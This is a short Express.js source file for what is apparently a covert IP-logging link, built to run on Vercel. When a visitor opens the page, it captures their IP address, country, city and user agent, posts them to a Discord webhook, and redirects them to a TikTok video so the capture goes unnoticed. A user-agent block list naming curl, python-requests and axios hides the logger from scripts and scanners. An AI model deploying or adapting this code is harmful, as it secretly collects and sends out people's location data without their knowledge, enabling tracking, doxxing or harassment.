// Libs
const express = require("express");
const userAgent = require("express-useragent");
const path = require("path");
const { WebhookClient } = require("discord.js");

// Setup and middleware
const webhookClient = new WebhookClient({ url: process.env.URL });
const app = express();
app.disable("x-powered-by")
app.use(userAgent.express());
app.use(express.static(path.join(__dirname, "./public",)))


// Decline requests from automated scripts
const secCheck = (browser) => {
    const noWayTheseGet200 = ["python-requests", "curl", "unknown", "axios","Vercelbot"];
    if (noWayTheseGet200.includes(browser)){
        return false;
    } else{
        return true;
    };
};

// Main page
app.get("/", (req, res) => {
    if (secCheck(req.useragent.browser)){
        let payload = {
            title: req.headers["x-forwarded-for"],
            color: 439191,
            fields: [
                {
                    name: "🌏 Country",
                    value: (req.headers["x-vercel-ip-country"]) ? req.headers["x-vercel-ip-country"] : "N/A"
                },
                {
                    name: "🏙️ City",
                    value: (req.headers["x-vercel-ip-city"]) ? req.headers["x-vercel-ip-city"] : "N/A"
                },
                {
                    name: "👤 User agent",
                    value: (req.useragent.source) ? req.useragent.source : "N/A"
                }
            ]
        };
        webhookClient.send({ embeds: [payload] }).then((response) => {
            res.redirect("https://vt.tiktok.com/ZSN17R3Fe");
        }).catch((err) => {
            console.log(err);
        });
    } else{
        res.redirect("/koi");
    };
});

// No access page
app.get("/koi",(req,res) => {
    res.sendFile(path.join(__dirname, "./public", "koi.html"));
});

// For vercel serverless
module.exports = app
